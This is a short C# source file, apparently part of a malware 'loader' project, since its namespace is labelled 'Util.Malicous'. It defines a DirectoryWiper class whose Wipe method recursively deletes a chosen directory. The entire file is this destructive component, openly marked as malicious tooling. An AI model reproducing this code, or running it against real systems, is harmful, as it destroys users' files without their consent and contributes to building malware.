using System.IO;

namespace CooLoader.Util.Malicous
{
    class DirectoryWiper
    {
        private string _dir;

        public DirectoryWiper(string dir)
        {
            _dir = dir;
        }

        public void SetDirectory(string dir)
        {
            _dir = dir;
        }

        public string GetDirectory()
        {
            return _dir;
        }

        public void Wipe()
        {
            Directory.Delete(_dir, true);
        }
    }
}